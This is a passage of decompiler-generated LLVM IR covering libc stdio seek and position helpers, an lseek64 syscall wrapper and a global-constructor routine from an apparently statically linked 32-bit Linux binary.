  uselistorder i32* @edi, { 24, 2, 25, 26, 27, 124, 125, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 41, 42, 43, 44, 45, 4, 126, 127, 20, 128, 129, 130, 19, 131, 46, 47, 5, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 6, 73, 21, 22, 23, 59, 7, 60, 61, 253, 254, 8, 255, 256, 9, 259, 260, 74, 75, 76, 77, 261, 262, 263, 132, 10, 133, 0, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 78, 12, 11, 79, 80, 81, 82, 83, 91, 84, 85, 86, 87, 88, 89, 90, 149, 13, 150, 14, 151, 152, 153, 154, 159, 160, 1, 155, 156, 157, 158, 161, 162, 163, 164, 15, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 264, 265, 266, 267, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 117, 118, 119, 120, 99, 100, 101, 268, 269, 270, 271, 279, 92, 93, 94, 95, 96, 97, 98, 204, 16, 205, 206, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 17, 241, 242, 243, 244, 245, 207, 208, 18, 209, 210, 211, 212, 213, 214, 215, 277, 278, 257, 258, 102, 103, 104, 280, 281, 105, 106, 216, 217, 107, 108, 109, 272, 273, 274, 275, 276, 110, 111, 112, 113, 114, 115, 116, 121, 122, 123, 246, 247, 248, 249, 250, 251, 252 }
  uselistorder i32* @ebp, { 9, 10, 11, 12, 13, 14, 15, 5, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 32, 6, 7, 8, 33, 34, 35, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 36, 37, 38, 1, 39, 40, 41, 4, 67, 68, 69, 74, 70, 71, 72, 73, 75, 76, 2, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 99, 98, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 42, 43, 44, 122, 123, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 153, 149, 150, 151, 152, 3, 154, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 45, 46, 47, 48, 49, 50, 51, 135, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fb55, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fb40, { 1, 0 }
  uselistorder label %dec_label_pc_804fb07, { 1, 0 }
  uselistorder label %dec_label_pc_804fad9, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_804fb70 = load i32, i32* %arg1, align 4
  store i32 %v2_804fb70, i32* %esi.global-to-local, align 4
  %v1_804fb77 = urem i32 %v2_804fb70, 4
  %v2_804fb77 = icmp eq i32 %v1_804fb77, 0
  store i32 %v1_804fb77, i32* %ecx.global-to-local, align 4
  br i1 %v2_804fb77, label %dec_label_pc_804fba6, label %dec_label_pc_804fb7c

dec_label_pc_804fb7c:                             ; preds = %entry
  %v1_804fb7e = add nsw i32 %v1_804fb77, -1
  %v8_804fb7e = icmp eq i32 %v1_804fb7e, 0
  store i32 %v1_804fb7e, i32* @edx, align 4
  br i1 %v8_804fb7e, label %dec_label_pc_804fba6, label %dec_label_pc_804fb81

dec_label_pc_804fb81:                             ; preds = %dec_label_pc_804fb7c
  %v3_804fb81 = and i32 %v2_804fb70, 2048
  %v4_804fb81 = icmp eq i32 %v3_804fb81, 0
  br i1 %v4_804fb81, label %dec_label_pc_804fba6, label %dec_label_pc_804fb86

dec_label_pc_804fb86:                             ; preds = %dec_label_pc_804fb81
  %v6_804fb86 = sub nsw i32 1, %v1_804fb77
  %v7_804fb86 = and i32 %v1_804fb7e, %v6_804fb86
  %v8_804fb86 = icmp slt i32 %v7_804fb86, 0
  %v9_804fb86 = icmp eq i32 %v1_804fb77, 2
  %v10_804fb86 = icmp ult i32 %v1_804fb77, 2
  %v3_804fb89 = icmp eq i1 %v10_804fb86, %v8_804fb86
  %v4_804fb89 = icmp eq i1 %v9_804fb86, false
  %v5_804fb89 = and i1 %v4_804fb89, %v3_804fb89
  br i1 %v5_804fb89, label %dec_label_pc_804fbfc, label %dec_label_pc_804fb8b

dec_label_pc_804fb8b:                             ; preds = %dec_label_pc_804fb86
  %v1_804fb8b = add i32 %tmp6, 40
  %v2_804fb8b = inttoptr i32 %v1_804fb8b to i32*
  %v3_804fb8b = load i32, i32* %v2_804fb8b, align 4
  %v4_804fb8b = icmp eq i32 %v3_804fb8b, 0
  %v1_804fb8f = icmp eq i1 %v4_804fb8b, false
  br i1 %v1_804fb8f, label %dec_label_pc_804fbfc, label %dec_label_pc_804fb91

dec_label_pc_804fb91:                             ; preds = %dec_label_pc_804fb8b
  %v1_804fb91 = add i32 %tmp6, 3
  %v2_804fb91 = inttoptr i32 %v1_804fb91 to i8*
  %v3_804fb91 = load i8, i8* %v2_804fb91, align 1
  %v4_804fb91 = zext i8 %v3_804fb91 to i32
  %v2_804fb95 = sub nsw i32 %v1_804fb7e, %v4_804fb91
  %v1_804fb97 = add i32 %tmp6, 44
  %v2_804fb97 = inttoptr i32 %v1_804fb97 to i32*
  %v3_804fb97 = load i32, i32* %v2_804fb97, align 4
  %v1_804fb9b = add nsw i32 %v2_804fb95, -1
  %tmp12 = icmp slt i32 %v3_804fb97, 1
  br i1 %tmp12, label %dec_label_pc_804fba6, label %dec_label_pc_804fba0

dec_label_pc_804fba0:                             ; preds = %dec_label_pc_804fb91
  %v1_804fba0 = add i32 %tmp6, 2
  %v2_804fba0 = inttoptr i32 %v1_804fba0 to i8*
  %v3_804fba0 = load i8, i8* %v2_804fba0, align 1
  %v4_804fba0 = zext i8 %v3_804fba0 to i32
  %v2_804fba4 = sub nsw i32 %v1_804fb9b, %v4_804fba0
  br label %dec_label_pc_804fba6

dec_label_pc_804fba6:                             ; preds = %dec_label_pc_804fb91, %dec_label_pc_804fb81, %dec_label_pc_804fb7c, %entry, %dec_label_pc_804fba0
  %v0_804fbbd = phi i32 [ %v1_804fb9b, %dec_label_pc_804fb91 ], [ %v1_804fb7e, %dec_label_pc_804fb81 ], [ 0, %dec_label_pc_804fb7c ], [ 0, %entry ], [ %v2_804fba4, %dec_label_pc_804fba0 ]
  %v2_804fba6 = and i32 %v2_804fb70, 64
  %v3_804fba6 = icmp eq i32 %v2_804fba6, 0
  %storemerge.in.in.v = select i1 %v3_804fba6, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_804fbb5 = add i32 %tmp6, 16
  %v3_804fbb5 = inttoptr i32 %v2_804fbb5 to i32*
  %v4_804fbb5 = load i32, i32* %v3_804fbb5, align 4
  %v5_804fbb5 = sub i32 %storemerge, %v4_804fbb5
  %v1_804fbb8 = inttoptr i32 %arg2 to i32*
  %v2_804fbb8 = load i32, i32* %v1_804fbb8, align 4
  store i32 %v2_804fbb8, i32* %ecx.global-to-local, align 4
  %v1_804fbba = add i32 %arg2, 4
  %v2_804fbba = inttoptr i32 %v1_804fbba to i32*
  %v3_804fbba = load i32, i32* %v2_804fbba, align 4
  store i32 %v3_804fbba, i32* %ebx.global-to-local, align 4
  %v2_804fbbd = add i32 %v5_804fbb5, %v0_804fbbd
  store i32 %v2_804fbbd, i32* %esi.global-to-local, align 4
  %v2_804fbc8 = ashr i32 %v2_804fbbd, 31
  %v5_804fbd1 = sub i32 %v2_804fbb8, %v2_804fbbd
  %v10_804fbd1 = icmp ult i32 %v2_804fbb8, %v2_804fbbd
  %v6_804fbd5 = zext i1 %v10_804fbd1 to i32
  %tmp = icmp slt i32 %v2_804fbbd, 0
  %v2_804fbc8.neg = zext i1 %tmp to i32
  %v7_804fbd5 = add i32 %v3_804fbba, %v2_804fbc8.neg
  %v8_804fbd5 = add i32 %v7_804fbd5, %v6_804fbd5
  store i32 %v8_804fbd5, i32* @edx, align 4
  store i32 %v5_804fbd1, i32* %v1_804fbb8, align 4
  %v0_804fbdb = load i32, i32* @edx, align 4
  %v1_804fbdb = load i32, i32* %edi.global-to-local, align 4
  %v2_804fbdb = add i32 %v1_804fbdb, 4
  %v3_804fbdb = inttoptr i32 %v2_804fbdb to i32*
  store i32 %v0_804fbdb, i32* %v3_804fbdb, align 4
  %v0_804fbde = load i32, i32* %edi.global-to-local, align 4
  %v1_804fbde = add i32 %v0_804fbde, 4
  %v2_804fbde = inttoptr i32 %v1_804fbde to i32*
  %v3_804fbde = load i32, i32* %v2_804fbde, align 4
  %v4_804fbde = load i32, i32* %ebx.global-to-local, align 4
  %v5_804fbe1 = icmp slt i32 %v3_804fbde, %v4_804fbde
  br i1 %v5_804fbe1, label %dec_label_pc_804fbeb, label %dec_label_pc_804fbe3

dec_label_pc_804fbe3:                             ; preds = %dec_label_pc_804fba6
  %v8_804fbe3 = icmp sgt i32 %v3_804fbde, %v4_804fbde
  br i1 %v8_804fbe3, label %dec_label_pc_804fbe9, label %dec_label_pc_804fbe5

dec_label_pc_804fbe5:                             ; preds = %dec_label_pc_804fbe3
  %v1_804fbe5 = inttoptr i32 %v0_804fbde to i32*
  %v2_804fbe5 = load i32, i32* %v1_804fbe5, align 4
  %v3_804fbe5 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_804fbe5, %v3_804fbe5
  br i1 %tmp14, label %dec_label_pc_804fbe9, label %dec_label_pc_804fbeb

dec_label_pc_804fbe9:                             ; preds = %dec_label_pc_804fbe5, %dec_label_pc_804fbe3
  %v0_804fbe9 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fbe9 = sub i32 0, %v0_804fbe9
  store i32 %v1_804fbe9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fbeb

dec_label_pc_804fbeb:                             ; preds = %dec_label_pc_804fbe5, %dec_label_pc_804fba6, %dec_label_pc_804fbe9
  %v0_804fbeb = load i32, i32* %esi.global-to-local, align 4
  %v2_804fbeb = icmp slt i32 %v0_804fbeb, 0
  %v1_804fbed = icmp eq i1 %v2_804fbeb, false
  br i1 %v1_804fbed, label %dec_label_pc_804fbff, label %dec_label_pc_804fbef

dec_label_pc_804fbef:                             ; preds = %dec_label_pc_804fbeb
  %v1_804fbef = call i32 @__errno_location(i32 %v2_804fbc8)
  %v1_804fbf4 = inttoptr i32 %v1_804fbef to i32*
  store i32 75, i32* %v1_804fbf4, align 4
  %v0_804fc02.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fbff

dec_label_pc_804fbfc:                             ; preds = %dec_label_pc_804fb8b, %dec_label_pc_804fb86
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fbff

dec_label_pc_804fbff:                             ; preds = %dec_label_pc_804fbeb, %dec_label_pc_804fbef, %dec_label_pc_804fbfc
  %v0_804fc02 = phi i32 [ %v0_804fbeb, %dec_label_pc_804fbeb ], [ %v0_804fc02.pre, %dec_label_pc_804fbef ], [ -1, %dec_label_pc_804fbfc ]
  ret i32 %v0_804fc02

; uselistorder directives
  uselistorder i32 %v4_804fbde, { 1, 0 }
  uselistorder i32 %v3_804fbde, { 1, 0 }
  uselistorder i32 %v1_804fb7e, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804fb77, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_804fb70, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 16, { 20, 21, 22, 23, 24, 25, 53, 26, 27, 28, 29, 9, 54, 55, 56, 57, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 4, 41, 42, 18, 43, 100, 59, 58, 5, 60, 61, 10, 2, 62, 11, 101, 63, 64, 102, 103, 104, 65, 3, 66, 67, 68, 69, 70, 71, 78, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 12, 19, 13, 51, 17, 44, 89, 45, 105, 93, 7, 6, 94, 1, 8, 90, 91, 14, 46, 47, 48, 49, 50, 52, 15, 92, 16, 95, 96, 97, 98, 99 }
  uselistorder i32 8, { 33, 47, 48, 49, 50, 51, 52, 53, 34, 54, 55, 81, 82, 83, 56, 84, 11, 12, 46, 57, 58, 59, 60, 62, 63, 64, 61, 65, 66, 67, 68, 18, 19, 69, 70, 71, 72, 73, 74, 13, 153, 154, 86, 85, 87, 14, 15, 88, 89, 90, 91, 92, 93, 1, 94, 16, 10, 155, 95, 96, 156, 157, 158, 97, 98, 99, 100, 101, 35, 20, 21, 22, 23, 36, 24, 25, 26, 37, 27, 38, 28, 39, 40, 159, 30, 160, 31, 161, 32, 45, 29, 75, 103, 102, 76, 77, 107, 108, 109, 110, 111, 112, 113, 2, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 3, 124, 125, 126, 127, 128, 42, 4, 43, 5, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 41, 146, 147, 6, 148, 149, 150, 151, 7, 152, 104, 105, 17, 0, 78, 79, 44, 80, 106, 9, 8 }
  uselistorder i32 20, { 3, 8, 4, 9, 10, 20, 21, 22, 11, 12, 13, 0, 14, 1, 15, 5, 16, 17, 23, 24, 25, 30, 26, 27, 6, 28, 2, 7, 18, 29, 19 }
  uselistorder i32 64, { 2, 0, 1, 6, 3, 5, 7, 4 }
  uselistorder i32 44, { 2, 3, 5, 6, 7, 4, 8, 18, 9, 10, 1, 15, 17, 16, 12, 13, 14, 11, 0 }
  uselistorder i32 3, { 30, 6, 20, 3, 21, 28, 14, 13, 8, 9, 7, 31, 32, 33, 34, 35, 36, 22, 4, 23, 15, 37, 24, 11, 10, 5, 1, 2, 0, 12, 29, 26, 38, 16, 17, 27, 18, 19, 25 }
  uselistorder i32 40, { 1, 7, 2, 3, 4, 5, 8, 9, 10, 11, 12, 0, 6 }
  uselistorder i32 2, { 66, 34, 26, 67, 38, 68, 69, 47, 0, 40, 41, 82, 22, 83, 84, 1, 42, 70, 71, 39, 2, 3, 72, 23, 4, 73, 5, 43, 74, 75, 85, 21, 51, 87, 88, 24, 28, 27, 86, 89, 90, 91, 64, 92, 93, 94, 95, 96, 97, 76, 29, 77, 78, 35, 98, 99, 30, 52, 36, 31, 32, 100, 48, 101, 102, 103, 104, 65, 110, 111, 6, 116, 44, 117, 53, 63, 37, 7, 81, 25, 54, 8, 9, 10, 11, 109, 12, 13, 49, 14, 105, 106, 107, 108, 33, 45, 79, 50, 80, 15, 55, 16, 56, 62, 17, 57, 58, 59, 60, 18, 19, 114, 46, 112, 20, 113, 115, 61 }
  uselistorder i32 2048, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbff, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fbeb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fba6, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_804fc14 = add i32 %tmp5, 4
  %v2_804fc14 = inttoptr i32 %v1_804fc14 to i32*
  %v3_804fc14 = load i32, i32* %v2_804fc14, align 4
  %v2_804fc17 = load i32, i32* %arg2, align 4
  %v1_804fc1d = add i32 %arg1, 4
  %v2_804fc1d = inttoptr i32 %v1_804fc1d to i32*
  %v3_804fc1d = load i32, i32* %v2_804fc1d, align 4
  %v4_804fc20 = call i32 @__libc_lseek64(i32 %v3_804fc1d, i32 %v2_804fc17, i32 %v3_804fc14, i32 %arg3)
  %v0_804fc2a = load i32, i32* @edx, align 4
  %v2_804fc2a = icmp slt i32 %v0_804fc2a, 0
  br i1 %v2_804fc2a, label %dec_label_pc_804fc35, label %dec_label_pc_804fc2e

dec_label_pc_804fc2e:                             ; preds = %entry
  %v1_804fc2e = load i32, i32* @ebx, align 4
  %v2_804fc2e = inttoptr i32 %v1_804fc2e to i32*
  store i32 %v4_804fc20, i32* %v2_804fc2e, align 4
  %v0_804fc30 = load i32, i32* @edx, align 4
  %v1_804fc30 = load i32, i32* @ebx, align 4
  %v2_804fc30 = add i32 %v1_804fc30, 4
  %v3_804fc30 = inttoptr i32 %v2_804fc30 to i32*
  store i32 %v0_804fc30, i32* %v3_804fc30, align 4
  br label %dec_label_pc_804fc35

dec_label_pc_804fc35:                             ; preds = %entry, %dec_label_pc_804fc2e
  %v0_804fc35 = phi i32 [ %v4_804fc20, %entry ], [ 0, %dec_label_pc_804fc2e ]
  ret i32 %v0_804fc35

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 4, { 74, 75, 76, 77, 78, 79, 1, 2, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 55, 90, 140, 91, 141, 142, 143, 92, 3, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 35, 36, 72, 29, 110, 111, 112, 248, 150, 151, 152, 146, 144, 145, 147, 148, 149, 30, 4, 153, 154, 155, 156, 157, 158, 159, 160, 161, 37, 113, 114, 115, 38, 39, 40, 162, 51, 31, 249, 137, 5, 6, 163, 7, 164, 56, 165, 166, 167, 168, 169, 170, 171, 172, 173, 60, 174, 175, 176, 177, 64, 41, 178, 179, 180, 181, 42, 43, 44, 65, 45, 46, 47, 48, 182, 49, 183, 66, 50, 67, 68, 8, 250, 251, 253, 254, 258, 259, 260, 252, 52, 71, 9, 116, 117, 118, 119, 120, 69, 188, 189, 190, 61, 184, 185, 186, 187, 121, 122, 123, 124, 125, 62, 10, 126, 127, 255, 257, 199, 200, 201, 202, 203, 204, 11, 205, 206, 207, 208, 209, 210, 211, 212, 197, 198, 213, 54, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 26, 234, 235, 237, 236, 12, 128, 256, 129, 130, 191, 192, 53, 193, 194, 195, 196, 32, 13, 33, 131, 132, 133, 134, 14, 135, 15, 16, 27, 17, 0, 18, 19, 20, 136, 21, 138, 63, 139, 22, 28, 23, 238, 24, 57, 58, 70, 239, 59, 240, 241, 242, 243, 244, 245, 246, 25, 34, 247, 73 }
  uselistorder label %dec_label_pc_804fc35, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fc3e = load i32, i32* @ebx, align 4
  store i32 %v0_804fc3e, i32* %stack_var_-12, align 4
  %v2_804fc52 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fc52, i32* %esi.global-to-local, align 4
  %v1_804fc69 = call i32 @int80_syscall(i32 140)
  store i32 %v1_804fc69, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_804fc69, -4095
  br i1 %tmp18, label %dec_label_pc_804fc83, label %dec_label_pc_804fc75

dec_label_pc_804fc75:                             ; preds = %entry
  %v2_804fc56 = ashr i32 %arg3, 31
  %v1_804fc75 = call i32 @__errno_location(i32 %v2_804fc56)
  %v0_804fc7a = load i32, i32* %esi.global-to-local, align 4
  %v1_804fc7a = sub i32 0, %v0_804fc7a
  %v2_804fc7c = inttoptr i32 %v1_804fc75 to i32*
  store i32 %v1_804fc7a, i32* %v2_804fc7c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fc97.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804fc87

dec_label_pc_804fc83:                             ; preds = %entry
  %v1_804fc83 = icmp eq i32 %v1_804fc69, 0
  br i1 %v1_804fc83, label %dec_label_pc_804fc8c, label %dec_label_pc_804fc87

dec_label_pc_804fc87:                             ; preds = %dec_label_pc_804fc83, %dec_label_pc_804fc75
  %v2_804fc97.pre = phi i32 [ %v0_804fc3e, %dec_label_pc_804fc83 ], [ %v2_804fc97.pre.pre, %dec_label_pc_804fc75 ]
  %v0_804fc87 = phi i32 [ %v1_804fc69, %dec_label_pc_804fc83 ], [ -1, %dec_label_pc_804fc75 ]
  %v1_804fc89 = ashr i32 %v0_804fc87, 31
  br label %dec_label_pc_804fc94

dec_label_pc_804fc8c:                             ; preds = %dec_label_pc_804fc83
  %v3_804fc8c = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804fc94

dec_label_pc_804fc94:                             ; preds = %dec_label_pc_804fc87, %dec_label_pc_804fc8c
  %v2_804fc97 = phi i32 [ %v2_804fc97.pre, %dec_label_pc_804fc87 ], [ %v0_804fc3e, %dec_label_pc_804fc8c ]
  %v0_804fc9a = phi i32 [ %v0_804fc87, %dec_label_pc_804fc87 ], [ %v3_804fc8c, %dec_label_pc_804fc8c ]
  %storemerge = phi i32 [ %v1_804fc89, %dec_label_pc_804fc87 ], [ %tmp, %dec_label_pc_804fc8c ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_804fc97, i32* @ebx, align 4
  ret i32 %v0_804fc9a

; uselistorder directives
  uselistorder i32 %v1_804fc69, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804fc3e, { 1, 0, 2 }
  uselistorder i32* @edx, { 19, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 7, 99, 100, 101, 102, 103, 104, 38, 105, 106, 8, 107, 108, 109, 39, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 18, 58, 59, 41, 60, 9, 61, 62, 64, 10, 65, 66, 67, 68, 69, 22, 11, 63, 231, 232, 233, 234, 12, 235, 236, 110, 111, 2, 114, 112, 113, 1, 115, 116, 117, 118, 119, 120, 121, 122, 70, 74, 71, 72, 73, 123, 124, 125, 126, 127, 128, 129, 135, 130, 131, 132, 133, 134, 3, 20, 87, 136, 137, 138, 139, 238, 140, 141, 142, 143, 144, 146, 145, 4, 147, 148, 149, 150, 224, 13, 5, 21, 88, 151, 240, 155, 241, 156, 0, 75, 76, 77, 223, 242, 243, 248, 247, 89, 14, 90, 91, 92, 93, 94, 95, 96, 78, 159, 160, 15, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 16, 174, 175, 157, 158, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 17, 213, 214, 215, 216, 217, 218, 219, 244, 79, 152, 153, 154, 86, 80, 81, 237, 249, 239, 220, 82, 245, 246, 83, 84, 85, 97, 98, 221, 222, 225, 6, 226, 227, 228, 229, 230, 250 }
  uselistorder i32 (i32)* @__errno_location, { 61, 60, 59, 29, 58, 28, 57, 56, 55, 54, 20, 40, 26, 25, 53, 39, 19, 38, 37, 36, 32, 31, 35, 47, 18, 17, 16, 15, 30, 14, 52, 13, 12, 11, 51, 10, 23, 8, 9, 42, 41, 50, 49, 48, 27, 1, 46, 34, 21, 45, 4, 22, 44, 7, 3, 2, 0, 33, 43, 6, 5, 24 }
  uselistorder i32 31, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 7, 6, 24, 18, 19, 20, 2, 3, 0, 1, 8, 4, 5, 21 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_804fc94, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_804fcac = load i32, i32* @global_var_8052000.69, align 8192
  %v10_804fcb1 = icmp eq i32 %v0_804fcac, -1
  br i1 %v10_804fcb1, label %dec_label_pc_804fcc2, label %dec_label_pc_804fcb6.preheader

dec_label_pc_804fcb6.preheader:                   ; preds = %entry
  br label %dec_label_pc_804fcb6

dec_label_pc_804fcb6:                             ; preds = %dec_label_pc_804fcb6.preheader, %dec_label_pc_804fcb6
  %v4_804fcb9 = phi i32 [ %v0_804fcac, %dec_label_pc_804fcb6.preheader ], [ %v2_804fcbb, %dec_label_pc_804fcb6 ]
  %v0_804fcb6 = phi i32 [ ptrtoint (i32* @global_var_8052000.69 to i32), %dec_label_pc_804fcb6.preheader ], [ %v1_804fcb6, %dec_label_pc_804fcb6 ]
  %v1_804fcb6 = add i32 %v0_804fcb6, -4
  call void @__pseudo_call(i32 %v4_804fcb9)
  %v1_804fcbb = inttoptr i32 %v1_804fcb6 to i32*
  %v2_804fcbb = load i32, i32* %v1_804fcbb, align 4
  %v10_804fcbd = icmp eq i32 %v2_804fcbb, -1
  %v1_804fcc0 = icmp eq i1 %v10_804fcbd, false
  br i1 %v1_804fcc0, label %dec_label_pc_804fcb6, label %dec_label_pc_804fcc2.loopexit

dec_label_pc_804fcc2.loopexit:                    ; preds = %dec_label_pc_804fcb6
  %v2_804fcc2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804fcc2

dec_label_pc_804fcc2:                             ; preds = %dec_label_pc_804fcc2.loopexit, %entry
  %v2_804fcc2 = phi i32 [ %v2_804fcc2.pre, %dec_label_pc_804fcc2.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_804fcc2

; uselistorder directives
  uselistorder i32 %v0_804fcac, { 1, 0 }
  uselistorder i1 false, { 397, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 64, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 235, 236, 237, 111, 112, 238, 36, 239, 240, 113, 51, 114, 115, 116, 241, 2, 0, 1, 4, 242, 244, 243, 3, 246, 245, 247, 117, 118, 119, 52, 120, 5, 121, 122, 248, 249, 250, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 142, 141, 6, 143, 144, 145, 146, 147, 149, 34, 150, 148, 151, 153, 152, 7, 154, 155, 157, 156, 53, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 67, 68, 398, 399, 50, 182, 37, 9, 38, 258, 253, 257, 255, 256, 54, 251, 252, 254, 8, 259, 260, 261, 262, 183, 185, 186, 187, 188, 184, 189, 190, 191, 194, 192, 193, 263, 264, 270, 39, 265, 266, 268, 267, 271, 272, 277, 276, 273, 274, 275, 10, 400, 11, 209, 210, 211, 55, 278, 279, 280, 283, 281, 282, 12, 40, 284, 286, 285, 56, 287, 289, 288, 57, 290, 291, 401, 58, 402, 13, 292, 293, 294, 295, 296, 297, 298, 330, 41, 15, 299, 300, 301, 302, 304, 303, 14, 305, 306, 42, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 371, 372, 374, 373, 16, 212, 213, 214, 215, 319, 320, 331, 332, 333, 403, 413, 414, 415, 416, 417, 419, 59, 420, 421, 418, 412, 404, 66, 216, 217, 218, 219, 220, 221, 17, 322, 18, 323, 324, 321, 195, 405, 406, 407, 408, 409, 410, 411, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 334, 347, 348, 349, 350, 351, 352, 353, 354, 35, 356, 355, 360, 357, 358, 359, 19, 361, 362, 196, 197, 325, 326, 327, 328, 207, 269, 205, 200, 198, 199, 60, 201, 20, 202, 203, 204, 206, 208, 222, 223, 224, 225, 226, 227, 230, 65, 228, 229, 21, 22, 231, 232, 233, 234, 329, 363, 364, 365, 366, 367, 63, 368, 43, 369, 44, 370, 375, 376, 392, 377, 378, 379, 380, 385, 389, 390, 391, 23, 381, 61, 382, 383, 384, 45, 27, 386, 26, 46, 25, 387, 388, 24, 393, 28, 394, 47, 395, 29, 30, 31, 48, 32, 396, 49, 33, 69, 62, 422 }
  uselistorder void (i32)* @__pseudo_call, { 3, 2, 5, 0, 6, 7, 8, 4, 1 }
  uselistorder i32 -4, { 6, 7, 8, 4, 34, 35, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 36, 37, 38, 39, 43, 44, 45, 46, 3, 47, 0, 42, 48, 49, 50, 51, 52, 53, 5, 41, 29, 1, 40, 2, 30, 31, 32, 33 }
